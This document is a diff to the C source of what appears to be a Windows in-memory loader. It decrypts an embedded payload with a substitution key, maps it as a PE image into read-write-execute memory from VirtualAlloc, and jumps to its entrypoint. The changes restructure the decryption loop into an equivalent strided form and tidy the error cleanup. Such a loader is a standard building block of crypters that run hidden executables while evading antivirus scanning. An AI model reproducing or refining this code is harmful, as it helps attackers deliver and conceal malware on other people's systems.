@@ -13,8 +13,10 @@
 #include <memoryapi.h>
 
 void decrypt_inmem(const uint8_t *key, const size_t key_len, uint8_t *payload, const size_t payload_len) {
-    for(size_t p=0; p<payload_len; ++p) {
-        payload[p]=key[payload[p]];
+    for(size_t s=0; s<16; ++s) {
+        for(size_t p=s; p<payload_len; p+=16) {
+            payload[p]=key[payload[p]];
+        }
     }
 }
 
@@ -34,16 +36,19 @@ void print_last_error(const char *add_msg) {
 }
 
 int main(int ac, char *as[]) {
+    pe_t *pe=NULL;
+    uint8_t *mem=NULL;
+
     decrypt_inmem(key, key_len, payload, payload_len);
 
-    pe_t *pe=pe_new(payload, payload_len);
+    pe=pe_new(payload, payload_len);
     if(pe == NULL) {
         return 1;
     }
 
     const size_t needed_size = pe_get_len(pe);
 
-    uint8_t *mem = VirtualAlloc(NULL, needed_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    mem = VirtualAlloc(NULL, needed_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
     if(mem == NULL) {
         print_last_error("Failed to allocate mem\n");
@@ -59,13 +64,15 @@ int main(int ac, char *as[]) {
 
     pe_free(pe);
     pe=NULL;
-    
+
     entrypoint();
 
     return 0;
 
 error:
-    pe_free(pe);
-    VirtualFree(mem, needed_size, MEM_RELEASE);
+    if(pe)
+        pe_free(pe);
+    if(mem)
+        VirtualFree(mem, needed_size, MEM_RELEASE);
     return 1;
 }
